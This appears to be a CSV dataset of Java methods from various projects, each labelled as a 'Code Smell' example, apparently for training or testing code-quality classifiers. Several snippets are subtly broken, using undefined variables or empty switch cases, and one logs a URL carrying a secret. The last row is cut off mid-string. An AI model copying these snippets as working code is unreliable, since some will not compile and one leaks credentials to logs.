text,label,text_label
"public AuthorizationSettingDetail toAuthorizationSettingDetail(List<MenuEntity> menuEntities){
  Map<String,MenuEntity> menuMap=menuEntities.stream().collect(Collectors.toMap(MenuEntity::getId,Function.identity()));
  AuthorizationSettingDetail detail=new AuthorizationSettingDetail();
  detail.setTargetType(targetType);
  detail.setTargetId(targetId);
  detail.setMerge(merge);
  detail.setPriority(priority);
  Map<String,Set<String>> permissionInfos=new ConcurrentHashMap<>();
  for (  MenuView menu : menus) {
    List<MenuView> expand=TreeSupportEntity.expandTree2List(menu,IDGenerator.MD5);
    for (    MenuView menuView : expand) {
      if (!menu.isGranted()) {
        continue;
      }
      MenuEntity entity=menuMap.get(menuView.getId());
      if (entity == null) {
        continue;
      }
      if (CollectionUtils.isNotEmpty(entity.getPermissions())) {
        for (        PermissionInfo permission : entity.getPermissions()) {
          if (StringUtils.hasText(permission.getPermission()) && CollectionUtils.isNotEmpty(permission.getActions())) {
            permissionInfos.computeIfAbsent(permission.getPermission(),ignore -> new HashSet<>()).addAll(permission.getActions());
          }
        }
      }
      if (CollectionUtils.isNotEmpty(menuView.getButtons())) {
        for (        MenuView.ButtonView button : menuView.getButtons()) {
          if (!button.isGranted()) {
            continue;
          }
          entity.getButton(button.getId()).ifPresent(buttonInfo -> {
            if (CollectionUtils.isNotEmpty(buttonInfo.getPermissions())) {
              for (              PermissionInfo permission : buttonInfo.getPermissions()) {
                if (CollectionUtils.isEmpty(permission.getActions())) {
                  continue;
                }
                permissionInfos.computeIfAbsent(permission.getPermission(),ignore -> new HashSet<>()).addAll(permission.getActions());
              }
            }
          }
);
        }
      }
    }
  }
  detail.setPermissionList(permissionInfos.entrySet().stream().map(e -> AuthorizationSettingDetail.PermissionInfo.of(e.getKey(),e.getValue())).collect(Collectors.toList()));
  return detail;
}",1,Code Smell
"public static void loadProxyList(){
  if (proxyListLoaded) {
    return;
  }
  SharedPreferences preferences=ApplicationLoader.applicationContext.getSharedPreferences(""mainconfig"",Activity.MODE_PRIVATE);
  String proxyAddress=preferences.getString(""proxy_ip"","""");
  String proxyUsername=preferences.getString(""proxy_user"","""");
  String proxyPassword=preferences.getString(""proxy_pass"","""");
  String proxySecret=preferences.getString(""proxy_secret"","""");
  int proxyPort=preferences.getInt(""proxy_port"",1080);
  proxyListLoaded=true;
  proxyList.clear();
  currentProxy=null;
  String list=preferences.getString(""proxy_list"",null);
  if (!TextUtils.isEmpty(list)) {
    byte[] bytes=Base64.decode(list,Base64.DEFAULT);
    SerializedData data=new SerializedData(bytes);
    int count=data.readInt32(false);
    if (count == -1) {
      int version=data.readByte(false);
      if (version == PROXY_SCHEMA_V2) {
        count=data.readInt32(false);
        for (int i=0; i < count; i++) {
          ProxyInfo info=new ProxyInfo(data.readString(false),data.readInt32(false),data.readString(false),data.readString(false),data.readString(false));
          info.ping=data.readInt64(false);
          info.availableCheckTime=data.readInt64(false);
          proxyList.add(0,info);
          if (currentProxy == null && !TextUtils.isEmpty(proxyAddress)) {
            if (proxyAddress.equals(info.address) && proxyPort == info.port && proxyUsername.equals(info.username) && proxyPassword.equals(info.password)) {
              currentProxy=info;
            }
          }
        }
      }
 else {
        FileLog.e(""Unknown proxy schema version: "" + version);
      }
    }
 else {
      for (int a=0; a < count; a++) {
        ProxyInfo info=new ProxyInfo(data.readString(false),data.readInt32(false),data.readString(false),data.readString(false),data.readString(false));
        proxyList.add(0,info);
        if (currentProxy == null && !TextUtils.isEmpty(proxyAddress)) {
          if (proxyAddress.equals(info.address) && proxyPort == info.port && proxyUsername.equals(info.username) && proxyPassword.equals(info.password)) {
            currentProxy=info;
          }
        }
      }
    }
    data.cleanup();
  }
  if (currentProxy == null && !TextUtils.isEmpty(proxyAddress)) {
    ProxyInfo info=currentProxy=new ProxyInfo(proxyAddress,proxyPort,proxyUsername,proxyPassword,proxySecret);
    proxyList.add(0,info);
  }
}",1,Code Smell
"@Override public void validateAndPostprocessResponse(HeaderPaginationList<I> respObj,Response httpResponse) throws IOException {
  super.validateAndPostprocessResponse(respObj,httpResponse);
  String link=httpResponse.header(""Link"");
  if (!TextUtils.isEmpty(link)) {
    Matcher matcher=LINK_HEADER_PATTERN.matcher(link);
    String url=null;
    while (matcher.find()) {
      if (url == null) {
        String _url=matcher.group(1);
        if (_url == null)         continue;
        url=_url;
      }
 else {
        String paramName=matcher.group(2);
        String paramValue=matcher.group(3);
        if (paramName == null || paramValue == null)         return;
        if (""rel"".equals(paramName)) {
switch (paramValue) {
case ""next"":
            ;
case ""prev"":
          ;
      }
      url=null;
    }
  }
}
}
}",1,Code Smell
"public void checkCamera(boolean request){
  if (parentAlert.baseFragment == null || parentAlert.baseFragment.getParentActivity() == null) {
    return;
  }
  boolean old=deviceHasGoodCamera;
  boolean old2=noCameraPermissions;
  if (!SharedConfig.inappCamera) {
    deviceHasGoodCamera=false;
  }
 else {
    if (Build.VERSION.SDK_INT >= 23) {
      if (noCameraPermissions=(parentAlert.baseFragment.getParentActivity().checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)) {
        if (request) {
          try {
            parentAlert.baseFragment.getParentActivity().requestPermissions(new String[]{Manifest.permission.CAMERA,Manifest.permission.READ_EXTERNAL_STORAGE},17);
          }
 catch (          Exception ignore) {
          }
        }
        deviceHasGoodCamera=false;
      }
 else {
        if (request || SharedConfig.hasCameraCache) {
          CameraController.getInstance().initCamera(null);
        }
        deviceHasGoodCamera=CameraController.getInstance().isCameraInitied();
      }
    }
 else {
      if (request || SharedConfig.hasCameraCache) {
        CameraController.getInstance().initCamera(null);
      }
      deviceHasGoodCamera=CameraController.getInstance().isCameraInitied();
    }
  }
  if (deviceHasGoodCamera && NekoConfig.disableInstantCamera.Bool()) {
    File file=new File(ApplicationLoader.getFilesDirFixed(),""cthumb.jpg"");
    if (file.exists())     file.delete();
  }
  if ((old != deviceHasGoodCamera || old2 != noCameraPermissions) && adapter != null) {
    adapter.notifyDataSetChanged();
  }
  if (parentAlert.isShowing() && deviceHasGoodCamera && parentAlert.baseFragment != null && parentAlert.getBackDrawable().getAlpha() != 0 && !cameraOpened && !NekoConfig.disableInstantCamera.Bool()) {
    showCamera();
  }
}",1,Code Smell
"private void doWriteState(){
  boolean wroteState=false;
  final int version;
  final ArrayMap<String,Setting> settings;
  final ArrayMap<String,String> namespaceBannedHashes;
synchronized (mLock) {
    version=mVersion;
    settings=new ArrayMap<>(mSettings);
    namespaceBannedHashes=new ArrayMap<>(mNamespaceBannedHashes);
    mDirty=false;
    mWriteScheduled=false;
  }
synchronized (mWriteLock) {
    if (DEBUG_PERSISTENCE) {
      Log.i(LOG_TAG,""[PERSIST START]"");
    }
    AtomicExtendedFile destination=new AtomicExtendedFile(mStatePersistFile.getFile());
    FileOutputStream out=null;
    try {
      out=destination.startWrite();
      TypedXmlSerializer serializer;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
        serializer=Xml.newBinarySerializer();
      }
 else {
        serializer=Xml.newFastSerializer();
        serializer.setFeature(""http://xmlpull.org/v1/doc/features.html#indent-output"",true);
      }
      serializer.startDocument(null,true);
      serializer.startTag(null,TAG_SETTINGS);
      serializer.attributeInt(null,ATTR_VERSION,version);
      final int settingCount=settings.size();
      for (int i=0; i < settingCount; i++) {
        Setting setting=settings.valueAt(i);
        if (writeSingleSetting(mVersion,serializer,setting.getId(),setting.getName(),setting.getValue(),setting.getDefaultValue(),setting.getPackageName(),setting.getTag(),setting.isDefaultFromSystem(),setting.isValuePreservedInRestore())) {
          if (DEBUG_PERSISTENCE) {
            Log.i(LOG_TAG,""[PERSISTED] %s=%s"",setting.getName(),setting.getValue());
          }
        }
      }
      serializer.endTag(null,TAG_SETTINGS);
      serializer.startTag(null,TAG_NAMESPACE_HASHES);
      for (int i=0; i < namespaceBannedHashes.size(); i++) {
        String namespace=namespaceBannedHashes.keyAt(i);
        String bannedHash=namespaceBannedHashes.get(namespace);
        if (writeSingleNamespaceHash(serializer,namespace,bannedHash)) {
          if (DEBUG_PERSISTENCE) {
            Log.i(LOG_TAG,""[PERSISTED] namespace=%s, bannedHash=%s"",namespace,bannedHash);
          }
        }
      }
      serializer.endTag(null,TAG_NAMESPACE_HASHES);
      serializer.endDocument();
      destination.finishWrite(out);
      wroteState=true;
      if (DEBUG_PERSISTENCE) {
        Log.i(LOG_TAG,""[PERSIST END]"");
      }
    }
 catch (    Throwable t) {
      Log.e(LOG_TAG,""Failed to write settings, restoring backup"",t);
      if (t instanceof IOException) {
        logSettingsDirectoryInformation(Paths.get(destination.getBaseFile()));
        if (t.getMessage().contains(""Couldn't create directory"")) {
          Path parentPath=Paths.get(destination.getBaseFile().getParentFile());
          if (parentPath.mkdirs()) {
            Log.i(LOG_TAG,""Successfully created %s"",parentPath);
          }
 else {
            Log.e(LOG_TAG,""Failed to write %s with Files.writeDirectories"",parentPath);
          }
        }
      }
      destination.failWrite(out);
    }
 finally {
      IoUtils.closeQuietly(out);
    }
  }
  if (wroteState) {
synchronized (mLock) {
      addHistoricalOperationLocked(HISTORICAL_OPERATION_PERSIST,null);
    }
  }
}",1,Code Smell
"@Override public void run(){
  while (!isStopped) {
    try {
      long currentTime=System.currentTimeMillis();
      Set<String> removedNodeKey=new HashSet<>();
      for (      Map.Entry<String,TimeoutInfo> entry : nodeMap.entrySet()) {
        if (TStringUtils.isBlank(entry.getKey()) || entry.getValue() == null) {
          continue;
        }
        if (currentTime >= entry.getValue().getTimeoutTime()) {
          removedNodeKey.add(entry.getKey());
        }
      }
      if (!removedNodeKey.isEmpty()) {
        for (        String nodeKey : removedNodeKey) {
          TimeoutInfo timeoutInfo=nodeMap.get(nodeKey);
          if (timeoutInfo == null) {
            continue;
          }
          if (currentTime >= timeoutInfo.getTimeoutTime()) {
            nodeMap.remove(nodeKey);
            listener.onTimeout(nodeKey,timeoutInfo);
          }
        }
      }
      Thread.sleep(1000 * 1);
    }
 catch (    Throwable t) {
      logger.error(new StringBuilder(256).append(businessType).append("" heartbeat scan error!"").toString(),t);
    }
  }
}",1,Code Smell
"private void onMoovContainerAtomRead(ContainerAtom moov) throws ParserException {
  Assertions.checkState(sideloadedTrack == null,""Unexpected moov box."");
  DrmInitData drmInitData=sideloadedDrmInitData != null ? sideloadedDrmInitData : getDrmInitDataFromAtoms(moov.leafChildren);
  ContainerAtom mvex=moov.getContainerAtomOfType(Atom.TYPE_mvex);
  SparseArray<DefaultSampleValues> defaultSampleValuesArray=new SparseArray<>();
  long duration=C.TIME_UNSET;
  int mvexChildrenSize=mvex.leafChildren.size();
  for (int i=0; i < mvexChildrenSize; i++) {
    Atom.LeafAtom atom=mvex.leafChildren.get(i);
    if (atom.type == Atom.TYPE_trex) {
      Pair<Integer,DefaultSampleValues> trexData=parseTrex(atom.data);
      defaultSampleValuesArray.put(trexData.first,trexData.second);
    }
 else     if (atom.type == Atom.TYPE_mehd) {
      duration=parseMehd(atom.data);
    }
  }
  SparseArray<Track> tracks=new SparseArray<>();
  int moovContainerChildrenSize=moov.containerChildren.size();
  for (int i=0; i < moovContainerChildrenSize; i++) {
    Atom.ContainerAtom atom=moov.containerChildren.get(i);
    if (atom.type == Atom.TYPE_trak) {
      Track track=modifyTrack(AtomParsers.parseTrak(atom,moov.getLeafAtomOfType(Atom.TYPE_mvhd),duration,drmInitData,(flags & FLAG_WORKAROUND_IGNORE_EDIT_LISTS) != 0,false));
      if (track != null) {
        tracks.put(track.id,track);
      }
    }
  }
  int trackCount=tracks.size();
  if (trackBundles.size() == 0) {
    for (int i=0; i < trackCount; i++) {
      Track track=tracks.valueAt(i);
      TrackBundle trackBundle=new TrackBundle(extractorOutput.track(i,track.type));
      trackBundle.init(track,getDefaultSampleValues(defaultSampleValuesArray,track.id));
      trackBundles.put(track.id,trackBundle);
      durationUs=Math.max(durationUs,track.durationUs);
    }
    maybeInitExtraTracks();
    extractorOutput.endTracks();
  }
 else {
    Assertions.checkState(trackBundles.size() == trackCount);
    for (int i=0; i < trackCount; i++) {
      Track track=tracks.valueAt(i);
      trackBundles.get(track.id).init(track,getDefaultSampleValues(defaultSampleValuesArray,track.id));
    }
  }
}",1,Code Smell
"private void xAggr(SqlSth sqlSth,Q q,List<Object> valueList){
  if (q instanceof Q.X) {
    Q.X rm=(Q.X)q;
    List<Bb> list=rm.getAggrList();
    if (list == null)     return;
    for (    Bb bb : list) {
      String key=bb.getKey();
      if (key.contains(SqlScript.PLACE_HOLDER) && Objects.isNull(bb.getValue()))       continue;
      List<String> originList=mapping((reg) -> key.split(reg),q,sqlSth.sbCondition);
      for (      String origin : originList) {
        addConditonBeforeOptimization(origin,sqlSth.conditionSet);
      }
      Object values=bb.getValue();
      if (values instanceof Object[]) {
        for (        Object obj : arr) {
          add(valueList,obj);
        }
      }
 else       if (values instanceof List) {
        for (        Object obj : arr) {
          add(valueList,obj);
        }
      }
    }
  }
}
",1,Code Smell
"@SuppressWarnings({""rawtypes"",""unchecked""}) public FunctionCallback getFunctionCallback(@NonNull String beanName,@Nullable String defaultDescription){
  Type beanType=FunctionContextUtils.findType(this.applicationContext.getBeanFactory(),beanName);
  if (beanType == null) {
    throw new IllegalArgumentException(""Functional bean with name: "" + beanName + "" does not exist in the context."");
  }
  if (!Function.class.isAssignableFrom(FunctionTypeUtils.getRawType(beanType))) {
    throw new IllegalArgumentException(""Function call Bean must be of type Function. Found: "" + beanType.getTypeName());
  }
  Type functionInputType=TypeResolverHelper.getFunctionArgumentType(beanType,0);
  Class<?> functionInputClass=FunctionTypeUtils.getRawType(functionInputType);
  String functionName=beanName;
  String functionDescription=defaultDescription;
  if (!StringUtils.hasText(functionDescription)) {
    Description descriptionAnnotation=applicationContext.findAnnotationOnBean(beanName,Description.class);
    if (descriptionAnnotation != null) {
      functionDescription=descriptionAnnotation.value();
    }
    if (!StringUtils.hasText(functionDescription)) {
      JsonClassDescription jsonClassDescriptionAnnotation=functionInputClass.getAnnotation(JsonClassDescription.class);
      if (jsonClassDescriptionAnnotation != null) {
        functionDescription=jsonClassDescriptionAnnotation.value();
      }
    }
    if (!StringUtils.hasText(functionDescription)) {
      throw new IllegalStateException(""Could not determine function description."" + ""Please provide a description either as a default parameter, via @Description annotation on the bean "" + ""or @JsonClassDescription annotation on the input class."");
    }
  }
  Object bean=this.applicationContext.getBean(beanName);
  if (bean instanceof Function<?,?>) {
    return FunctionCallbackWrapper.builder(function).withName(functionName).withSchemaType(this.schemaType).withDescription(functionDescription).withInputType(functionInputClass).build();
  }
 else {
    throw new IllegalArgumentException(""Bean must be of type Function"");
  }
}",1,Code Smell
"/** 
 * Attempt to match a complete address in content, starting with houseNumberMatch.
 * @param content          The string to search.
 * @param houseNumberMatch A matching house number to start extending.
 * @return +ve: the end of the match+ve: the position to restart searching for house numbers, negated.
 */
private static int attemptMatch(String content,MatchResult houseNumberMatch){
  int restartPos=-1;
  int nonZipMatch=-1;
  int it=houseNumberMatch.end();
  int numLines=1;
  boolean consecutiveHouseNumbers=true;
  boolean foundLocationName=false;
  int wordCount=1;
  String lastWord="""";
  Matcher matcher=sWordRe.matcher(content);
  for (; it < content.length(); lastWord=matcher.group(0), it=matcher.end()) {
    if (!matcher.find(it)) {
      return -content.length();
    }
    if (matcher.end() - matcher.start() > kMaxAddressNameWordLength) {
      return -matcher.end();
    }
    while (it < matcher.start()) {
      if (NL.indexOf(content.charAt(it++)) != -1)       ++numLines;
    }
    if (numLines > MAX_ADDRESS_LINES)     break;
    if (++wordCount > MAX_ADDRESS_WORDS)     break;
    if (matchHouseNumber(content,it) != null) {
      if (consecutiveHouseNumbers && numLines > 1) {
        return -it;
      }
      if (restartPos == -1)       restartPos=it;
      continue;
    }
    consecutiveHouseNumbers=false;
    if (isValidLocationName(matcher.group(0))) {
      foundLocationName=true;
      continue;
    }
    if (wordCount == MAX_LOCATION_NAME_DISTANCE && !foundLocationName) {
      it=matcher.end();
      break;
    }
    if (foundLocationName && wordCount > MIN_ADDRESS_WORDS) {
      MatchResult stateMatch=matchState(content,it);
      if (stateMatch != null) {
        if (lastWord.equals(""et"") && stateMatch.group(0).equals(""al"")) {
          it=stateMatch.end();
          break;
        }
        Matcher zipMatcher=sWordRe.matcher(content);
        if (zipMatcher.find(stateMatch.end())) {
          if (isValidZipCode(zipMatcher.group(0),stateMatch)) {
            return zipMatcher.end();
          }
        }
 else {
          nonZipMatch=stateMatch.end();
        }
      }
    }
  }
  if (nonZipMatch > 0)   return nonZipMatch;
  return -(restartPos > 0 ? restartPos : it);
}",1,Code Smell
"public static <A extends Annotation>A findAnnotation(Method method,Class<A> annotationType){
  A annotation=method.getAnnotation(annotationType);
  if (annotation != null) {
    return annotation;
  }
  return findAnnotation(method.getDeclaringClass(),method,annotationType);
}
private static <A extends Annotation>A findAnnotation(Class<?> declaringClass,Method method,Class<A> annotationType){
  if (declaringClass == null || declaringClass.equals(Object.class)) {
    return null;
  }
  if (declaringClass.getSuperclass() != null) {
    for (    Method methodCandidate : declaringClass.getSuperclass().getMethods()) {
      if (isOverride(method,methodCandidate)) {
        A annotation=findAnnotation(methodCandidate,annotationType);
        if (annotation != null) {
          return annotation;
        }
      }
    }
  }
  for (  Class<?> interfaceClass : declaringClass.getInterfaces()) {
    for (    Method methodCandidate : interfaceClass.getDeclaredMethods()) {
      if (isOverride(method,methodCandidate)) {
        A annotation=findAnnotation(methodCandidate,annotationType);
        if (annotation != null) {
          return annotation;
        }
      }
    }
    A annotation=findAnnotation(interfaceClass,method,annotationType);
    if (annotation != null) {
      return annotation;
    }
  }
  return findAnnotation(declaringClass.getSuperclass(),method,annotationType);
}
",1,Code Smell
"@Override public void init() throws NoSuchMethodException {
  if (isPad()) {
    findAndHookConstructor(""com.miui.home.recents.GestureStubView"",Context.class,new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        Context context=(Context)param.args[0];
        if (!isListen) {
          ContentObserver contentObserver=new ContentObserver(new Handler(context.getMainLooper())){
            @Override public void onChange(            boolean selfChange){
              isLock=getLockApp(context) != -1;
              if (isLock) {
                setGestureLine(context,1);
              }
 else {
                setGestureLine(context,0);
              }
            }
          }
;
          context.getContentResolver().registerContentObserver(Settings.Global.getUriFor(""key_lock_app""),false,contentObserver);
          isListen=true;
        }
      }
    }
);
    findAndHookMethod(""com.miui.home.recents.GestureInputHelper"",""onInputEvent"",InputEvent.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        if (isLock)         param.setResult(null);
      }
    }
);
    findAndHookConstructor(""com.miui.home.launcher.dock.DockControllerImpl"",""com.miui.home.launcher.hotseats.HotSeats"",""com.miui.home.launcher.Launcher"",new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        Context context=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        if (!isListen2) {
          ContentObserver contentObserver=new ContentObserver(new Handler(context.getMainLooper())){
            @Override public void onChange(            boolean selfChange){
              Object getMDockStateMachine=XposedHelpers.callMethod(param.thisObject,""getMDockStateMachine"");
              Object getMDockWindowManager=XposedHelpers.callMethod(param.thisObject,""getMDockWindowManager"");
              View mDockRootView=(View)XposedHelpers.getObjectField(getMDockWindowManager,""mDockRootView"");
              if (context == null) {
                logE(TAG,""DockControllerImpl context must not null"");
                return;
              }
              if (getLockApp(context) != -1) {
                XposedHelpers.callMethod(getMDockStateMachine,""notifyPinnedStateChanged"",false);
                mDockRootView.setVisibility(View.GONE);
              }
 else {
                XposedHelpers.callMethod(getMDockStateMachine,""notifyPinnedStateChanged"",true);
                mDockRootView.setVisibility(View.VISIBLE);
              }
            }
          }
;
          context.getContentResolver().registerContentObserver(Settings.Global.getUriFor(""key_lock_app""),false,contentObserver);
          isListen2=true;
        }
      }
    }
);
  }
 else {
    findAndHookConstructor(""com.miui.home.recents.NavStubView"",Context.class,new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        Context context=(Context)param.args[0];
        if (!isListen) {
          ContentObserver contentObserver=new ContentObserver(new Handler(context.getMainLooper())){
            @Override public void onChange(            boolean selfChange){
              isLock=getLockApp(context) != -1;
            }
          }
;
          context.getContentResolver().registerContentObserver(Settings.Global.getUriFor(""key_lock_app""),false,contentObserver);
          isListen=true;
        }
      }
    }
);
    findAndHookMethod(""com.miui.home.recents.NavStubView"",""onTouchEvent"",MotionEvent.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        if (isLock)         param.setResult(false);
      }
    }
);
  }
}",1,Code Smell
"@WorkerThread @NoOps @Status public static int init(@NonNull Context context,boolean force){
  String mode=getMode();
  sDirectRoot=hasRoot();
  if (MODE_AUTO.equals(mode)) {
    autoDetectRootSystemOrAdbAndPersist(context);
    return sIsAdb ? STATUS_SUCCESS : initPermissionsWithSuccess();
  }
  if (!force && isAMServiceUpAndRunning(context,mode)) {
    return sIsAdb ? STATUS_SUCCESS : initPermissionsWithSuccess();
  }
  if (MODE_NO_ROOT.equals(mode)) {
    sDirectRoot=false;
    sIsAdb=sIsSystem=sIsRoot=false;
    ExUtils.exceptionAsIgnored(() -> {
      if (LocalServer.alive(context)) {
        LocalServer.getInstance().closeBgServer();
      }
    }
);
    LocalServices.stopServices();
    return STATUS_SUCCESS;
  }
  try {
switch (mode) {
case MODE_ROOT:
      if (!sDirectRoot) {
        throw new Exception(""Root is unavailable."");
      }
    ExUtils.exceptionAsIgnored(() -> {
      if (LocalServer.alive(context)) {
        LocalServer.getInstance().closeBgServer();
      }
    }
);
  sIsSystem=sIsAdb=false;
sIsRoot=true;
LocalServices.bindServicesIfNotAlready();
return initPermissionsWithSuccess();
case MODE_ADB_WIFI:
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
if (!Utils.isWifiActive(context.getApplicationContext())) {
throw new Exception(""Wifi not enabled."");
}
if (AdbUtils.enableWirelessDebugging(context)) {
return STATUS_AUTO_CONNECT_WIRELESS_DEBUGGING;
}
 else {
return STATUS_WIRELESS_DEBUGGING_CHOOSER_REQUIRED;
}
}
case MODE_ADB_OVER_TCP:
sIsRoot=sIsSystem=false;
sIsAdb=true;
ServerConfig.setAdbPort(findAdbPort(context,10,AdbUtils.getAdbPortOrDefault()));
LocalServer.restart();
LocalServices.bindServicesIfNotAlready();
return checkRootOrIncompleteUsbDebuggingInAdb();
}
}
 catch (Throwable e) {
Log.e(TAG,e);
sIsAdb=sIsSystem=sIsRoot=false;
ThreadUtils.postOnMainThread(() -> UIUtils.displayLongToast(R.string.failed_to_use_the_current_mode_of_operation));
}
return STATUS_FAILURE;
}",1,Code Smell
"private void calculatePath(PlayerEntity player,double tickDelta){
  for (  Path path : paths)   path.clear();
  ItemStack itemStack=player.getMainHandStack();
  if (!items.get().contains(itemStack.getItem())) {
    itemStack=player.getOffHandStack();
    if (!items.get().contains(itemStack.getItem()))     return;
  }
  if (!simulator.set(player,itemStack,0,accurate.get(),tickDelta))   return;
  getEmptyPath().calculate();
  if (itemStack.getItem() instanceof CrossbowItem && EnchantmentHelper.getLevel(Enchantments.MULTISHOT,itemStack) > 0) {
    if (!simulator.set(player,itemStack,MULTISHOT_OFFSET,accurate.get(),tickDelta))     return;
    getEmptyPath().calculate();
    if (!simulator.set(player,itemStack,-MULTISHOT_OFFSET,accurate.get(),tickDelta))     return;
    getEmptyPath().calculate();
  }
}",1,Code Smell
"@Override public void connectionsUpdated(int[] positions){
  if (mFilteredConn == null) {
    for (    int pos : positions)     notifyItemChanged(pos);
    return;
  }
  ConnectionsRegister reg=CaptureService.requireConnsRegister();
  int first_removed_pos=-1;
  int num_just_removed=0;
  Arrays.sort(positions);
  for (  int reg_pos : positions) {
    ConnectionDescriptor conn=reg.getConn(reg_pos);
    if (conn != null) {
      int pos=getFilteredItemPos(conn.incr_id);
      if (pos != -1) {
        pos-=num_just_removed;
        if (matches(conn)) {
          Log.d(TAG,""Changed item "" + pos + "", dataset size: ""+ getItemCount());
          notifyItemChanged(pos);
        }
 else {
          Log.d(TAG,""Unmatch item "" + pos + "": ""+ conn.toString());
          removeFilteredItemAt(pos);
          num_just_removed++;
          if (first_removed_pos == -1)           first_removed_pos=pos;
        }
      }
    }
  }
  if (first_removed_pos != -1)   fixFilteredPositions(first_removed_pos);
}",1,Code Smell
"void writeIndexes(int[] indexes){
  boolean useIndexMap=this.indexMap != null;
  boolean useFixedIndexOffset=this.fixedIndexOffset != NO_FIXED_OFFSET;
  int valueCount;
  if (isCompressed(indexes)) {
    if (useFixedIndexOffset) {
      valueCount=decompressWithOffset(indexes,this.fixedIndexOffset,this.indexConsumer);
    }
 else {
      valueCount=decompress(indexes,useIndexMap ? this.indexMapConsumer : this.indexConsumer);
    }
  }
 else {
    if (useIndexMap) {
      for (int i=0; i < indexes.length; i++) {
        TranslucentData.writeQuadVertexIndexes(this.indexBuffer,this.indexMap[indexes[i]]);
      }
    }
 else     if (useFixedIndexOffset) {
      for (int i=0; i < indexes.length; i++) {
        TranslucentData.writeQuadVertexIndexes(this.indexBuffer,this.fixedIndexOffset + indexes[i]);
      }
    }
 else {
      TranslucentData.writeQuadVertexIndexes(this.indexBuffer,indexes);
    }
    valueCount=indexes.length;
  }
  if (useIndexMap || useFixedIndexOffset) {
    checkModificationCounter(valueCount);
  }
}",1,Code Smell
"@EventHandler(priority=EventPriority.LOW) private void onTick(TickEvent.Pre event){
  if (Modules.get().get(AutoGap.class).isEating())   return;
  if (eating) {
    if (shouldEat()) {
      if (mc.player.getInventory().getStack(slot).get(DataComponentTypes.FOOD) != null) {
        int slot=findSlot();
        if (slot == -1) {
          stopEating();
          return;
        }
 else {
          changeSlot(slot);
        }
      }
      eat();
    }
 else {
      stopEating();
    }
  }
 else {
    if (shouldEat()) {
      slot=findSlot();
      if (slot != -1)       startEating();
    }
  }
}",1,Code Smell
"public File verifyAndSaveFile(@NotNull MultipartFile originFile,String parentDir,boolean isBase64,String newFileName,String... fileTypes) throws HydraLabRuntimeException, IOException {
  File parentDirFile=new File(parentDir);
  if (!parentDirFile.exists() && !parentDirFile.mkdirs()) {
    throw new HydraLabRuntimeException(HttpStatus.INTERNAL_SERVER_ERROR.value(),""mkdirs failed!"");
  }
  String filename=FileUtil.getLegalFileName(originFile.getOriginalFilename());
  String fileSuffix=null;
  boolean isMatch=false;
  if (filename == null) {
    throw new HydraLabRuntimeException(HttpStatus.BAD_REQUEST.value(),""error file type: "" + filename);
  }
  if (fileTypes != null) {
    for (    String fileType : fileTypes) {
      if (filename.endsWith(fileType)) {
        fileSuffix=fileType;
        isMatch=true;
        break;
      }
    }
    if (!isMatch) {
      throw new HydraLabRuntimeException(HttpStatus.BAD_REQUEST.value(),""error file type: "" + filename);
    }
  }
  if (StringUtils.isEmpty(newFileName)) {
    newFileName=filename.replace(fileSuffix,"""") + ""_"" + System.currentTimeMillis() % 10000 + ""_"" + fileSuffix;
  }
  newFileName=FileUtil.getLegalFileName(newFileName);
  File file=new File(parentDir,newFileName);
  InputStream inputStream=originFile.getInputStream();
  if (isBase64) {
    inputStream=new Base64InputStream(originFile.getInputStream());
  }
  try (FileOutputStream fileOutputStream=new FileOutputStream(file)){
    IOUtils.copy(inputStream,fileOutputStream);
    return file;
  }
 }",1,Code Smell
"public static HashMap<String,Integer> getThemeFileValues(File file,String assetName,String[] wallpaperLink){
  FileInputStream stream=null;
  HashMap<String,Integer> stringMap=new HashMap<>(500);
  try {
    byte[] bytes=new byte[1024];
    int currentPosition=0;
    if (assetName != null) {
      file=getAssetFile(assetName);
    }
    stream=new FileInputStream(file);
    int idx;
    int read;
    boolean finished=false;
    int wallpaperFileOffset=-1;
    while ((read=stream.read(bytes)) != -1) {
      int previousPosition=currentPosition;
      int start=0;
      for (int a=0; a < read; a++) {
        if (bytes[a] == '\n') {
          int len=a - start + 1;
          String line=new String(bytes,start,len - 1);
          if (line.startsWith(""WLS="")) {
            if (wallpaperLink != null && wallpaperLink.length > 0) {
              wallpaperLink[0]=line.substring(4);
            }
          }
 else           if (line.startsWith(""WPS"")) {
            wallpaperFileOffset=currentPosition + len;
            finished=true;
            break;
          }
 else {
            if ((idx=line.indexOf('=')) != -1) {
              String key=line.substring(0,idx);
              String param=line.substring(idx + 1);
              int value;
              if (param.length() > 0 && param.charAt(0) == '#') {
                try {
                  value=Color.parseColor(param);
                }
 catch (                Exception ignore) {
                  value=Utilities.parseInt(param);
                }
              }
 else {
                value=Utilities.parseInt(param);
              }
              stringMap.put(key,value);
            }
          }
          start+=len;
          currentPosition+=len;
        }
      }
      if (previousPosition == currentPosition) {
        break;
      }
      stream.getChannel().position(currentPosition);
      if (finished) {
        break;
      }
    }
    stringMap.put(""wallpaperFileOffset"",wallpaperFileOffset);
  }
 catch (  Throwable e) {
    FileLog.e(e);
  }
 finally {
    try {
      if (stream != null) {
        stream.close();
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
  return stringMap;
}",1,Code Smell
"public void sendGetForImg(MediaServer mediaServerItem,String api,Map<String,Object> params,String targetPath,String fileName){
  String url=String.format(""http://%s:%s/index/api/%s"",mediaServerItem.getIp(),mediaServerItem.getHttpPort(),api);
  HttpUrl parseUrl=HttpUrl.parse(url);
  if (parseUrl == null) {
    return;
  }
  HttpUrl.Builder httpBuilder=parseUrl.newBuilder();
  httpBuilder.addQueryParameter(""secret"",mediaServerItem.getSecret());
  if (params != null) {
    for (    Map.Entry<String,Object> param : params.entrySet()) {
      httpBuilder.addQueryParameter(param.getKey(),param.getValue().toString());
    }
  }
  Request request=new Request.Builder().url(httpBuilder.build()).build();
  logger.info(request.toString());
  try {
    OkHttpClient client=getClient();
    Response response=client.newCall(request).execute();
    if (response.isSuccessful()) {
      if (targetPath != null) {
        File snapFolder=new File(targetPath);
        if (!snapFolder.exists()) {
          if (!snapFolder.mkdirs()) {
            logger.warn(""{}璺緞鍒涘缓澶辫触"",snapFolder.getAbsolutePath());
